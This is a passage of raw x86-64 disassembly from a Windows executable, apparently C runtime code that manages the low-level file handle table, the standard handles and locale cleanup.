   140006acb:	c3                   	ret
   140006acc:	90                   	nop
   140006acd:	90                   	nop
   140006ace:	90                   	nop
   140006acf:	90                   	nop
   140006ad0:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140006ad5:	48 89 6c 24 10       	mov    %rbp,0x10(%rsp)
   140006ada:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   140006adf:	57                   	push   %rdi
   140006ae0:	48 83 ec 20          	sub    $0x20,%rsp
   140006ae4:	ba 40 00 00 00       	mov    $0x40,%edx
   140006ae9:	8b ca                	mov    %edx,%ecx
   140006aeb:	e8 48 dd ff ff       	call   0x140004838
   140006af0:	33 f6                	xor    %esi,%esi
   140006af2:	48 8b d8             	mov    %rax,%rbx
   140006af5:	48 85 c0             	test   %rax,%rax
   140006af8:	74 4c                	je     0x140006b46
   140006afa:	48 8d a8 00 10 00 00 	lea    0x1000(%rax),%rbp
   140006b01:	48 3b c5             	cmp    %rbp,%rax
   140006b04:	74 3d                	je     0x140006b43
   140006b06:	48 8d 78 30          	lea    0x30(%rax),%rdi
   140006b0a:	48 8d 4f d0          	lea    -0x30(%rdi),%rcx
   140006b0e:	45 33 c0             	xor    %r8d,%r8d
   140006b11:	ba a0 0f 00 00       	mov    $0xfa0,%edx
   140006b16:	e8 e1 fc ff ff       	call   0x1400067fc
   140006b1b:	48 83 4f f8 ff       	orq    $0xffffffffffffffff,-0x8(%rdi)
   140006b20:	48 89 37             	mov    %rsi,(%rdi)
   140006b23:	c7 47 08 00 00 0a 0a 	movl   $0xa0a0000,0x8(%rdi)
   140006b2a:	c6 47 0c 0a          	movb   $0xa,0xc(%rdi)
   140006b2e:	80 67 0d f8          	andb   $0xf8,0xd(%rdi)
   140006b32:	40 88 77 0e          	mov    %sil,0xe(%rdi)
   140006b36:	48 8d 7f 40          	lea    0x40(%rdi),%rdi
   140006b3a:	48 8d 47 d0          	lea    -0x30(%rdi),%rax
   140006b3e:	48 3b c5             	cmp    %rbp,%rax
   140006b41:	75 c7                	jne    0x140006b0a
   140006b43:	48 8b f3             	mov    %rbx,%rsi
   140006b46:	33 c9                	xor    %ecx,%ecx
   140006b48:	e8 f3 db ff ff       	call   0x140004740
   140006b4d:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140006b52:	48 8b c6             	mov    %rsi,%rax
   140006b55:	48 8b 74 24 40       	mov    0x40(%rsp),%rsi
   140006b5a:	48 8b 6c 24 38       	mov    0x38(%rsp),%rbp
   140006b5f:	48 83 c4 20          	add    $0x20,%rsp
   140006b63:	5f                   	pop    %rdi
   140006b64:	c3                   	ret
   140006b65:	90                   	nop
   140006b66:	90                   	nop
   140006b67:	90                   	nop
   140006b68:	48 85 c9             	test   %rcx,%rcx
   140006b6b:	74 4a                	je     0x140006bb7
   140006b6d:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140006b72:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   140006b77:	57                   	push   %rdi
   140006b78:	48 83 ec 20          	sub    $0x20,%rsp
   140006b7c:	48 8d b1 00 10 00 00 	lea    0x1000(%rcx),%rsi
   140006b83:	48 8b d9             	mov    %rcx,%rbx
   140006b86:	48 8b f9             	mov    %rcx,%rdi
   140006b89:	48 3b ce             	cmp    %rsi,%rcx
   140006b8c:	74 12                	je     0x140006ba0
   140006b8e:	48 8b cf             	mov    %rdi,%rcx
   140006b91:	ff 15 b9 55 00 00    	call   *0x55b9(%rip)        # 0x14000c150
   140006b97:	48 83 c7 40          	add    $0x40,%rdi
   140006b9b:	48 3b fe             	cmp    %rsi,%rdi
   140006b9e:	75 ee                	jne    0x140006b8e
   140006ba0:	48 8b cb             	mov    %rbx,%rcx
   140006ba3:	e8 98 db ff ff       	call   0x140004740
   140006ba8:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140006bad:	48 8b 74 24 38       	mov    0x38(%rsp),%rsi
   140006bb2:	48 83 c4 20          	add    $0x20,%rsp
   140006bb6:	5f                   	pop    %rdi
   140006bb7:	c3                   	ret
   140006bb8:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140006bbd:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   140006bc2:	48 89 7c 24 18       	mov    %rdi,0x18(%rsp)
   140006bc7:	41 57                	push   %r15
   140006bc9:	48 83 ec 30          	sub    $0x30,%rsp
   140006bcd:	8b f1                	mov    %ecx,%esi
   140006bcf:	33 db                	xor    %ebx,%ebx
   140006bd1:	8b c3                	mov    %ebx,%eax
   140006bd3:	81 f9 00 20 00 00    	cmp    $0x2000,%ecx
   140006bd9:	0f 92 c0             	setb   %al
   140006bdc:	85 c0                	test   %eax,%eax
   140006bde:	75 15                	jne    0x140006bf5
   140006be0:	e8 0b e1 ff ff       	call   0x140004cf0
   140006be5:	bb 09 00 00 00       	mov    $0x9,%ebx
   140006bea:	89 18                	mov    %ebx,(%rax)
   140006bec:	e8 df df ff ff       	call   0x140004bd0
   140006bf1:	8b c3                	mov    %ebx,%eax
   140006bf3:	eb 74                	jmp    0x140006c69
   140006bf5:	b9 07 00 00 00       	mov    $0x7,%ecx
   140006bfa:	e8 7d f8 ff ff       	call   0x14000647c
   140006bff:	90                   	nop
   140006c00:	90                   	nop
   140006c01:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
   140006c08:	00 
   140006c09:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
   140006c10:	48 8b fb             	mov    %rbx,%rdi
   140006c13:	48 89 5c 24 20       	mov    %rbx,0x20(%rsp)
   140006c18:	8b 05 f2 fd 00 00    	mov    0xfdf2(%rip),%eax        # 0x140016a10
   140006c1e:	3b f0                	cmp    %eax,%esi
   140006c20:	7c 3b                	jl     0x140006c5d
   140006c22:	4c 8d 3d e7 f9 00 00 	lea    0xf9e7(%rip),%r15        # 0x140016610
   140006c29:	49 39 1c ff          	cmp    %rbx,(%r15,%rdi,8)
   140006c2d:	74 02                	je     0x140006c31
   140006c2f:	eb 22                	jmp    0x140006c53
   140006c31:	e8 9a fe ff ff       	call   0x140006ad0
   140006c36:	49 89 04 ff          	mov    %rax,(%r15,%rdi,8)
   140006c3a:	48 85 c0             	test   %rax,%rax
   140006c3d:	75 05                	jne    0x140006c44
   140006c3f:	8d 58 0c             	lea    0xc(%rax),%ebx
   140006c42:	eb 19                	jmp    0x140006c5d
   140006c44:	8b 05 c6 fd 00 00    	mov    0xfdc6(%rip),%eax        # 0x140016a10
   140006c4a:	83 c0 40             	add    $0x40,%eax
   140006c4d:	89 05 bd fd 00 00    	mov    %eax,0xfdbd(%rip)        # 0x140016a10
   140006c53:	48 ff c7             	inc    %rdi
   140006c56:	48 89 7c 24 20       	mov    %rdi,0x20(%rsp)
   140006c5b:	eb c1                	jmp    0x140006c1e
   140006c5d:	b9 07 00 00 00       	mov    $0x7,%ecx
   140006c62:	e8 69 f8 ff ff       	call   0x1400064d0
   140006c67:	eb 88                	jmp    0x140006bf1
   140006c69:	48 8b 5c 24 40       	mov    0x40(%rsp),%rbx
   140006c6e:	48 8b 74 24 48       	mov    0x48(%rsp),%rsi
   140006c73:	48 8b 7c 24 50       	mov    0x50(%rsp),%rdi
   140006c78:	48 83 c4 30          	add    $0x30,%rsp
   140006c7c:	41 5f                	pop    %r15
   140006c7e:	c3                   	ret
   140006c7f:	90                   	nop
   140006c80:	48 63 c9             	movslq %ecx,%rcx
   140006c83:	48 8d 15 86 f9 00 00 	lea    0xf986(%rip),%rdx        # 0x140016610
   140006c8a:	48 8b c1             	mov    %rcx,%rax
   140006c8d:	83 e1 3f             	and    $0x3f,%ecx
   140006c90:	48 c1 f8 06          	sar    $0x6,%rax
   140006c94:	48 c1 e1 06          	shl    $0x6,%rcx
   140006c98:	48 03 0c c2          	add    (%rdx,%rax,8),%rcx
   140006c9c:	48 ff 25 9d 54 00 00 	rex.W jmp *0x549d(%rip)        # 0x14000c140
   140006ca3:	90                   	nop
   140006ca4:	48 63 c9             	movslq %ecx,%rcx
   140006ca7:	48 8d 15 62 f9 00 00 	lea    0xf962(%rip),%rdx        # 0x140016610
   140006cae:	48 8b c1             	mov    %rcx,%rax
   140006cb1:	83 e1 3f             	and    $0x3f,%ecx
   140006cb4:	48 c1 f8 06          	sar    $0x6,%rax
   140006cb8:	48 c1 e1 06          	shl    $0x6,%rcx
   140006cbc:	48 03 0c c2          	add    (%rdx,%rax,8),%rcx
   140006cc0:	48 ff 25 81 54 00 00 	rex.W jmp *0x5481(%rip)        # 0x14000c148
   140006cc7:	90                   	nop
   140006cc8:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140006ccd:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   140006cd2:	48 89 7c 24 18       	mov    %rdi,0x18(%rsp)
   140006cd7:	41 56                	push   %r14
   140006cd9:	48 83 ec 20          	sub    $0x20,%rsp
   140006cdd:	48 63 d9             	movslq %ecx,%rbx
   140006ce0:	85 c9                	test   %ecx,%ecx
   140006ce2:	78 72                	js     0x140006d56
   140006ce4:	3b 1d 26 fd 00 00    	cmp    0xfd26(%rip),%ebx        # 0x140016a10
   140006cea:	73 6a                	jae    0x140006d56
   140006cec:	48 8b fb             	mov    %rbx,%rdi
   140006cef:	4c 8d 35 1a f9 00 00 	lea    0xf91a(%rip),%r14        # 0x140016610
   140006cf6:	83 e7 3f             	and    $0x3f,%edi
   140006cf9:	48 8b f3             	mov    %rbx,%rsi
   140006cfc:	48 c1 fe 06          	sar    $0x6,%rsi
   140006d00:	48 c1 e7 06          	shl    $0x6,%rdi
   140006d04:	49 8b 04 f6          	mov    (%r14,%rsi,8),%rax
   140006d08:	f6 44 38 38 01       	testb  $0x1,0x38(%rax,%rdi,1)
   140006d0d:	74 47                	je     0x140006d56
   140006d0f:	48 83 7c 38 28 ff    	cmpq   $0xffffffffffffffff,0x28(%rax,%rdi,1)
   140006d15:	74 3f                	je     0x140006d56
   140006d17:	e8 28 c8 ff ff       	call   0x140003544
   140006d1c:	83 f8 01             	cmp    $0x1,%eax
   140006d1f:	75 27                	jne    0x140006d48
   140006d21:	85 db                	test   %ebx,%ebx
   140006d23:	74 16                	je     0x140006d3b
   140006d25:	2b d8                	sub    %eax,%ebx
   140006d27:	74 0b                	je     0x140006d34
   140006d29:	3b d8                	cmp    %eax,%ebx
   140006d2b:	75 1b                	jne    0x140006d48
   140006d2d:	b9 f4 ff ff ff       	mov    $0xfffffff4,%ecx
   140006d32:	eb 0c                	jmp    0x140006d40
   140006d34:	b9 f5 ff ff ff       	mov    $0xfffffff5,%ecx
   140006d39:	eb 05                	jmp    0x140006d40
   140006d3b:	b9 f6 ff ff ff       	mov    $0xfffffff6,%ecx
   140006d40:	33 d2                	xor    %edx,%edx
   140006d42:	ff 15 d0 54 00 00    	call   *0x54d0(%rip)        # 0x14000c218
   140006d48:	49 8b 04 f6          	mov    (%r14,%rsi,8),%rax
   140006d4c:	48 83 4c 38 28 ff    	orq    $0xffffffffffffffff,0x28(%rax,%rdi,1)
   140006d52:	33 c0                	xor    %eax,%eax
   140006d54:	eb 16                	jmp    0x140006d6c
   140006d56:	e8 95 df ff ff       	call   0x140004cf0
   140006d5b:	c7 00 09 00 00 00    	movl   $0x9,(%rax)
   140006d61:	e8 6a df ff ff       	call   0x140004cd0
   140006d66:	83 20 00             	andl   $0x0,(%rax)
   140006d69:	83 c8 ff             	or     $0xffffffff,%eax
   140006d6c:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140006d71:	48 8b 74 24 38       	mov    0x38(%rsp),%rsi
   140006d76:	48 8b 7c 24 40       	mov    0x40(%rsp),%rdi
   140006d7b:	48 83 c4 20          	add    $0x20,%rsp
   140006d7f:	41 5e                	pop    %r14
   140006d81:	c3                   	ret
   140006d82:	90                   	nop
   140006d83:	90                   	nop
   140006d84:	48 83 ec 28          	sub    $0x28,%rsp
   140006d88:	83 f9 fe             	cmp    $0xfffffffe,%ecx
   140006d8b:	75 15                	jne    0x140006da2
   140006d8d:	e8 3e df ff ff       	call   0x140004cd0
   140006d92:	83 20 00             	andl   $0x0,(%rax)
   140006d95:	e8 56 df ff ff       	call   0x140004cf0
   140006d9a:	c7 00 09 00 00 00    	movl   $0x9,(%rax)
   140006da0:	eb 4e                	jmp    0x140006df0
   140006da2:	85 c9                	test   %ecx,%ecx
   140006da4:	78 32                	js     0x140006dd8
   140006da6:	3b 0d 64 fc 00 00    	cmp    0xfc64(%rip),%ecx        # 0x140016a10
   140006dac:	73 2a                	jae    0x140006dd8
   140006dae:	48 63 d1             	movslq %ecx,%rdx
   140006db1:	48 8d 0d 58 f8 00 00 	lea    0xf858(%rip),%rcx        # 0x140016610
   140006db8:	48 8b c2             	mov    %rdx,%rax
   140006dbb:	83 e2 3f             	and    $0x3f,%edx
   140006dbe:	48 c1 f8 06          	sar    $0x6,%rax
   140006dc2:	48 c1 e2 06          	shl    $0x6,%rdx
   140006dc6:	48 8b 04 c1          	mov    (%rcx,%rax,8),%rax
   140006dca:	f6 44 10 38 01       	testb  $0x1,0x38(%rax,%rdx,1)
   140006dcf:	74 07                	je     0x140006dd8
   140006dd1:	48 8b 44 10 28       	mov    0x28(%rax,%rdx,1),%rax
   140006dd6:	eb 1c                	jmp    0x140006df4
   140006dd8:	e8 f3 de ff ff       	call   0x140004cd0
   140006ddd:	83 20 00             	andl   $0x0,(%rax)
   140006de0:	e8 0b df ff ff       	call   0x140004cf0
   140006de5:	c7 00 09 00 00 00    	movl   $0x9,(%rax)
   140006deb:	e8 e0 dd ff ff       	call   0x140004bd0
   140006df0:	48 83 c8 ff          	or     $0xffffffffffffffff,%rax
   140006df4:	48 83 c4 28          	add    $0x28,%rsp
   140006df8:	c3                   	ret
   140006df9:	90                   	nop
   140006dfa:	90                   	nop
   140006dfb:	90                   	nop
   140006dfc:	48 8b c4             	mov    %rsp,%rax
   140006dff:	48 89 58 08          	mov    %rbx,0x8(%rax)
   140006e03:	48 89 68 10          	mov    %rbp,0x10(%rax)
   140006e07:	48 89 70 18          	mov    %rsi,0x18(%rax)
   140006e0b:	48 89 78 20          	mov    %rdi,0x20(%rax)
   140006e0f:	41 56                	push   %r14
   140006e11:	48 81 ec 90 00 00 00 	sub    $0x90,%rsp
   140006e18:	48 8d 48 88          	lea    -0x78(%rax),%rcx
   140006e1c:	ff 15 ae 52 00 00    	call   *0x52ae(%rip)        # 0x14000c0d0
   140006e22:	45 33 f6             	xor    %r14d,%r14d
   140006e25:	66 44 39 74 24 62    	cmp    %r14w,0x62(%rsp)
   140006e2b:	0f 84 98 00 00 00    	je     0x140006ec9
   140006e31:	48 8b 44 24 68       	mov    0x68(%rsp),%rax
   140006e36:	48 85 c0             	test   %rax,%rax
   140006e39:	0f 84 8a 00 00 00    	je     0x140006ec9
   140006e3f:	48 63 18             	movslq (%rax),%rbx
   140006e42:	48 8d 70 04          	lea    0x4(%rax),%rsi
   140006e46:	bf 00 20 00 00       	mov    $0x2000,%edi
   140006e4b:	48 03 de             	add    %rsi,%rbx
   140006e4e:	39 38                	cmp    %edi,(%rax)
   140006e50:	0f 4c 38             	cmovl  (%rax),%edi
   140006e53:	8b cf                	mov    %edi,%ecx
   140006e55:	e8 5e fd ff ff       	call   0x140006bb8
   140006e5a:	3b 3d b0 fb 00 00    	cmp    0xfbb0(%rip),%edi        # 0x140016a10
   140006e60:	0f 4f 3d a9 fb 00 00 	cmovg  0xfba9(%rip),%edi        # 0x140016a10
   140006e67:	85 ff                	test   %edi,%edi
   140006e69:	74 5e                	je     0x140006ec9
   140006e6b:	41 8b ee             	mov    %r14d,%ebp
   140006e6e:	48 83 3b ff          	cmpq   $0xffffffffffffffff,(%rbx)
   140006e72:	74 45                	je     0x140006eb9
   140006e74:	48 83 3b fe          	cmpq   $0xfffffffffffffffe,(%rbx)
   140006e78:	74 3f                	je     0x140006eb9
   140006e7a:	f6 06 01             	testb  $0x1,(%rsi)
   140006e7d:	74 3a                	je     0x140006eb9
   140006e7f:	f6 06 08             	testb  $0x8,(%rsi)
   140006e82:	75 0d                	jne    0x140006e91
   140006e84:	48 8b 0b             	mov    (%rbx),%rcx
   140006e87:	ff 15 93 53 00 00    	call   *0x5393(%rip)        # 0x14000c220
   140006e8d:	85 c0                	test   %eax,%eax
   140006e8f:	74 28                	je     0x140006eb9
   140006e91:	48 8b cd             	mov    %rbp,%rcx
   140006e94:	48 8d 15 75 f7 00 00 	lea    0xf775(%rip),%rdx        # 0x140016610
   140006e9b:	83 e1 3f             	and    $0x3f,%ecx
   140006e9e:	48 8b c5             	mov    %rbp,%rax
   140006ea1:	48 c1 f8 06          	sar    $0x6,%rax
   140006ea5:	48 c1 e1 06          	shl    $0x6,%rcx
   140006ea9:	48 03 0c c2          	add    (%rdx,%rax,8),%rcx
   140006ead:	48 8b 03             	mov    (%rbx),%rax
   140006eb0:	48 89 41 28          	mov    %rax,0x28(%rcx)
   140006eb4:	8a 06                	mov    (%rsi),%al
   140006eb6:	88 41 38             	mov    %al,0x38(%rcx)
   140006eb9:	48 ff c5             	inc    %rbp
   140006ebc:	48 ff c6             	inc    %rsi
   140006ebf:	48 83 c3 08          	add    $0x8,%rbx
   140006ec3:	48 83 ef 01          	sub    $0x1,%rdi
   140006ec7:	75 a5                	jne    0x140006e6e
   140006ec9:	4c 8d 9c 24 90 00 00 	lea    0x90(%rsp),%r11
   140006ed0:	00 
   140006ed1:	49 8b 5b 10          	mov    0x10(%r11),%rbx
   140006ed5:	49 8b 6b 18          	mov    0x18(%r11),%rbp
   140006ed9:	49 8b 73 20          	mov    0x20(%r11),%rsi
   140006edd:	49 8b 7b 28          	mov    0x28(%r11),%rdi
   140006ee1:	49 8b e3             	mov    %r11,%rsp
   140006ee4:	41 5e                	pop    %r14
   140006ee6:	c3                   	ret
   140006ee7:	90                   	nop
   140006ee8:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140006eed:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   140006ef2:	48 89 7c 24 18       	mov    %rdi,0x18(%rsp)
   140006ef7:	41 56                	push   %r14
   140006ef9:	48 83 ec 20          	sub    $0x20,%rsp
   140006efd:	33 ff                	xor    %edi,%edi
   140006eff:	45 33 f6             	xor    %r14d,%r14d
   140006f02:	48 63 df             	movslq %edi,%rbx
   140006f05:	48 8d 0d 04 f7 00 00 	lea    0xf704(%rip),%rcx        # 0x140016610
   140006f0c:	48 8b c3             	mov    %rbx,%rax
   140006f0f:	83 e3 3f             	and    $0x3f,%ebx
   140006f12:	48 c1 f8 06          	sar    $0x6,%rax
   140006f16:	48 c1 e3 06          	shl    $0x6,%rbx
   140006f1a:	48 03 1c c1          	add    (%rcx,%rax,8),%rbx
   140006f1e:	48 8b 43 28          	mov    0x28(%rbx),%rax
   140006f22:	48 83 c0 02          	add    $0x2,%rax
   140006f26:	48 83 f8 01          	cmp    $0x1,%rax
   140006f2a:	76 09                	jbe    0x140006f35
   140006f2c:	80 4b 38 80          	orb    $0x80,0x38(%rbx)
   140006f30:	e9 89 00 00 00       	jmp    0x140006fbe
   140006f35:	c6 43 38 81          	movb   $0x81,0x38(%rbx)
   140006f39:	8b cf                	mov    %edi,%ecx
   140006f3b:	85 ff                	test   %edi,%edi
   140006f3d:	74 16                	je     0x140006f55
   140006f3f:	83 e9 01             	sub    $0x1,%ecx
   140006f42:	74 0a                	je     0x140006f4e
   140006f44:	83 f9 01             	cmp    $0x1,%ecx
   140006f47:	b9 f4 ff ff ff       	mov    $0xfffffff4,%ecx
   140006f4c:	eb 0c                	jmp    0x140006f5a
   140006f4e:	b9 f5 ff ff ff       	mov    $0xfffffff5,%ecx
   140006f53:	eb 05                	jmp    0x140006f5a
   140006f55:	b9 f6 ff ff ff       	mov    $0xfffffff6,%ecx
   140006f5a:	ff 15 00 52 00 00    	call   *0x5200(%rip)        # 0x14000c160
   140006f60:	48 8b f0             	mov    %rax,%rsi
   140006f63:	48 8d 48 01          	lea    0x1(%rax),%rcx
   140006f67:	48 83 f9 01          	cmp    $0x1,%rcx
   140006f6b:	76 0b                	jbe    0x140006f78
   140006f6d:	48 8b c8             	mov    %rax,%rcx
   140006f70:	ff 15 aa 52 00 00    	call   *0x52aa(%rip)        # 0x14000c220
   140006f76:	eb 02                	jmp    0x140006f7a
   140006f78:	33 c0                	xor    %eax,%eax
   140006f7a:	85 c0                	test   %eax,%eax
   140006f7c:	74 1d                	je     0x140006f9b
   140006f7e:	0f b6 c8             	movzbl %al,%ecx
   140006f81:	48 89 73 28          	mov    %rsi,0x28(%rbx)
   140006f85:	83 f9 02             	cmp    $0x2,%ecx
   140006f88:	75 06                	jne    0x140006f90
   140006f8a:	80 4b 38 40          	orb    $0x40,0x38(%rbx)
   140006f8e:	eb 2e                	jmp    0x140006fbe
   140006f90:	83 f9 03             	cmp    $0x3,%ecx
   140006f93:	75 29                	jne    0x140006fbe
   140006f95:	80 4b 38 08          	orb    $0x8,0x38(%rbx)
   140006f99:	eb 23                	jmp    0x140006fbe
   140006f9b:	80 4b 38 40          	orb    $0x40,0x38(%rbx)
   140006f9f:	48 c7 43 28 fe ff ff 	movq   $0xfffffffffffffffe,0x28(%rbx)
   140006fa6:	ff 
   140006fa7:	48 8b 05 ba fa 00 00 	mov    0xfaba(%rip),%rax        # 0x140016a68
   140006fae:	48 85 c0             	test   %rax,%rax
   140006fb1:	74 0b                	je     0x140006fbe
   140006fb3:	49 8b 04 06          	mov    (%r14,%rax,1),%rax
   140006fb7:	c7 40 18 fe ff ff ff 	movl   $0xfffffffe,0x18(%rax)
   140006fbe:	ff c7                	inc    %edi
   140006fc0:	49 83 c6 08          	add    $0x8,%r14
   140006fc4:	83 ff 03             	cmp    $0x3,%edi
   140006fc7:	0f 85 35 ff ff ff    	jne    0x140006f02
   140006fcd:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140006fd2:	48 8b 74 24 38       	mov    0x38(%rsp),%rsi
   140006fd7:	48 8b 7c 24 40       	mov    0x40(%rsp),%rdi
   140006fdc:	48 83 c4 20          	add    $0x20,%rsp
   140006fe0:	41 5e                	pop    %r14
   140006fe2:	c3                   	ret
   140006fe3:	90                   	nop
   140006fe4:	53                   	push   %rbx
   140006fe5:	48 83 ec 20          	sub    $0x20,%rsp
   140006fe9:	b9 07 00 00 00       	mov    $0x7,%ecx
   140006fee:	e8 89 f4 ff ff       	call   0x14000647c
   140006ff3:	33 db                	xor    %ebx,%ebx
   140006ff5:	33 c9                	xor    %ecx,%ecx
   140006ff7:	e8 bc fb ff ff       	call   0x140006bb8
   140006ffc:	85 c0                	test   %eax,%eax
   140006ffe:	75 0c                	jne    0x14000700c
   140007000:	e8 f7 fd ff ff       	call   0x140006dfc
   140007005:	e8 de fe ff ff       	call   0x140006ee8
   14000700a:	b3 01                	mov    $0x1,%bl
   14000700c:	b9 07 00 00 00       	mov    $0x7,%ecx
   140007011:	e8 ba f4 ff ff       	call   0x1400064d0
   140007016:	8a c3                	mov    %bl,%al
   140007018:	48 83 c4 20          	add    $0x20,%rsp
   14000701c:	5b                   	pop    %rbx
   14000701d:	c3                   	ret
   14000701e:	90                   	nop
   14000701f:	90                   	nop
   140007020:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140007025:	57                   	push   %rdi
   140007026:	48 83 ec 20          	sub    $0x20,%rsp
   14000702a:	33 db                	xor    %ebx,%ebx
   14000702c:	48 8d 3d dd f5 00 00 	lea    0xf5dd(%rip),%rdi        # 0x140016610
   140007033:	48 8b 0c 3b          	mov    (%rbx,%rdi,1),%rcx
   140007037:	48 85 c9             	test   %rcx,%rcx
   14000703a:	74 0a                	je     0x140007046
   14000703c:	e8 27 fb ff ff       	call   0x140006b68
   140007041:	48 83 24 3b 00       	andq   $0x0,(%rbx,%rdi,1)
   140007046:	48 83 c3 08          	add    $0x8,%rbx
   14000704a:	48 81 fb 00 04 00 00 	cmp    $0x400,%rbx
   140007051:	72 d9                	jb     0x14000702c
   140007053:	b0 01                	mov    $0x1,%al
   140007055:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   14000705a:	48 83 c4 20          	add    $0x20,%rsp
   14000705e:	5f                   	pop    %rdi
   14000705f:	c3                   	ret
   140007060:	48 85 c9             	test   %rcx,%rcx
   140007063:	0f 84 00 01 00 00    	je     0x140007169
   140007069:	53                   	push   %rbx
   14000706a:	48 83 ec 20          	sub    $0x20,%rsp
   14000706e:	48 8b d9             	mov    %rcx,%rbx
   140007071:	48 8b 49 18          	mov    0x18(%rcx),%rcx
   140007075:	48 3b 0d fc e6 00 00 	cmp    0xe6fc(%rip),%rcx        # 0x140015778
   14000707c:	74 05                	je     0x140007083
   14000707e:	e8 bd d6 ff ff       	call   0x140004740
   140007083:	48 8b 4b 20          	mov    0x20(%rbx),%rcx
   140007087:	48 3b 0d f2 e6 00 00 	cmp    0xe6f2(%rip),%rcx        # 0x140015780
   14000708e:	74 05                	je     0x140007095
   140007090:	e8 ab d6 ff ff       	call   0x140004740
   140007095:	48 8b 4b 28          	mov    0x28(%rbx),%rcx
   140007099:	48 3b 0d e8 e6 00 00 	cmp    0xe6e8(%rip),%rcx        # 0x140015788
   1400070a0:	74 05                	je     0x1400070a7
   1400070a2:	e8 99 d6 ff ff       	call   0x140004740
   1400070a7:	48 8b 4b 30          	mov    0x30(%rbx),%rcx
   1400070ab:	48 3b 0d de e6 00 00 	cmp    0xe6de(%rip),%rcx        # 0x140015790
   1400070b2:	74 05                	je     0x1400070b9
   1400070b4:	e8 87 d6 ff ff       	call   0x140004740
   1400070b9:	48 8b 4b 38          	mov    0x38(%rbx),%rcx
   1400070bd:	48 3b 0d d4 e6 00 00 	cmp    0xe6d4(%rip),%rcx        # 0x140015798
   1400070c4:	74 05                	je     0x1400070cb
   1400070c6:	e8 75 d6 ff ff       	call   0x140004740
   1400070cb:	48 8b 4b 40          	mov    0x40(%rbx),%rcx
   1400070cf:	48 3b 0d ca e6 00 00 	cmp    0xe6ca(%rip),%rcx        # 0x1400157a0
   1400070d6:	74 05                	je     0x1400070dd
   1400070d8:	e8 63 d6 ff ff       	call   0x140004740
   1400070dd:	48 8b 4b 48          	mov    0x48(%rbx),%rcx
   1400070e1:	48 3b 0d c0 e6 00 00 	cmp    0xe6c0(%rip),%rcx        # 0x1400157a8
   1400070e8:	74 05                	je     0x1400070ef
   1400070ea:	e8 51 d6 ff ff       	call   0x140004740
   1400070ef:	48 8b 4b 68          	mov    0x68(%rbx),%rcx
   1400070f3:	48 3b 0d ce e6 00 00 	cmp    0xe6ce(%rip),%rcx        # 0x1400157c8
   1400070fa:	74 05                	je     0x140007101
   1400070fc:	e8 3f d6 ff ff       	call   0x140004740
   140007101:	48 8b 4b 70          	mov    0x70(%rbx),%rcx
   140007105:	48 3b 0d c4 e6 00 00 	cmp    0xe6c4(%rip),%rcx        # 0x1400157d0
   14000710c:	74 05                	je     0x140007113
   14000710e:	e8 2d d6 ff ff       	call   0x140004740
   140007113:	48 8b 4b 78          	mov    0x78(%rbx),%rcx
   140007117:	48 3b 0d ba e6 00 00 	cmp    0xe6ba(%rip),%rcx        # 0x1400157d8
   14000711e:	74 05                	je     0x140007125
   140007120:	e8 1b d6 ff ff       	call   0x140004740
   140007125:	48 8b 8b 80 00 00 00 	mov    0x80(%rbx),%rcx
   14000712c:	48 3b 0d ad e6 00 00 	cmp    0xe6ad(%rip),%rcx        # 0x1400157e0
   140007133:	74 05                	je     0x14000713a
   140007135:	e8 06 d6 ff ff       	call   0x140004740
   14000713a:	48 8b 8b 88 00 00 00 	mov    0x88(%rbx),%rcx
   140007141:	48 3b 0d a0 e6 00 00 	cmp    0xe6a0(%rip),%rcx        # 0x1400157e8
   140007148:	74 05                	je     0x14000714f
   14000714a:	e8 f1 d5 ff ff       	call   0x140004740
   14000714f:	48 8b 8b 90 00 00 00 	mov    0x90(%rbx),%rcx
   140007156:	48 3b 0d 93 e6 00 00 	cmp    0xe693(%rip),%rcx        # 0x1400157f0
   14000715d:	74 05                	je     0x140007164
   14000715f:	e8 dc d5 ff ff       	call   0x140004740
   140007164:	48 83 c4 20          	add    $0x20,%rsp
   140007168:	5b                   	pop    %rbx
   140007169:	c3                   	ret
   14000716a:	90                   	nop
   14000716b:	90                   	nop
   14000716c:	48 85 c9             	test   %rcx,%rcx
   14000716f:	74 66                	je     0x1400071d7
   140007171:	53                   	push   %rbx
   140007172:	48 83 ec 20          	sub    $0x20,%rsp
   140007176:	48 8b d9             	mov    %rcx,%rbx
   140007179:	48 8b 09             	mov    (%rcx),%rcx
   14000717c:	48 3b 0d dd e5 00 00 	cmp    0xe5dd(%rip),%rcx        # 0x140015760
   140007183:	74 05                	je     0x14000718a
   140007185:	e8 b6 d5 ff ff       	call   0x140004740
   14000718a:	48 8b 4b 08          	mov    0x8(%rbx),%rcx
   14000718e:	48 3b 0d d3 e5 00 00 	cmp    0xe5d3(%rip),%rcx        # 0x140015768
   140007195:	74 05                	je     0x14000719c
   140007197:	e8 a4 d5 ff ff       	call   0x140004740
   14000719c:	48 8b 4b 10          	mov    0x10(%rbx),%rcx
   1400071a0:	48 3b 0d c9 e5 00 00 	cmp    0xe5c9(%rip),%rcx        # 0x140015770
   1400071a7:	74 05                	je     0x1400071ae
   1400071a9:	e8 92 d5 ff ff       	call   0x140004740
   1400071ae:	48 8b 4b 58          	mov    0x58(%rbx),%rcx
   1400071b2:	48 3b 0d ff e5 00 00 	cmp    0xe5ff(%rip),%rcx        # 0x1400157b8
   1400071b9:	74 05                	je     0x1400071c0
   1400071bb:	e8 80 d5 ff ff       	call   0x140004740
   1400071c0:	48 8b 4b 60          	mov    0x60(%rbx),%rcx
   1400071c4:	48 3b 0d f5 e5 00 00 	cmp    0xe5f5(%rip),%rcx        # 0x1400157c0
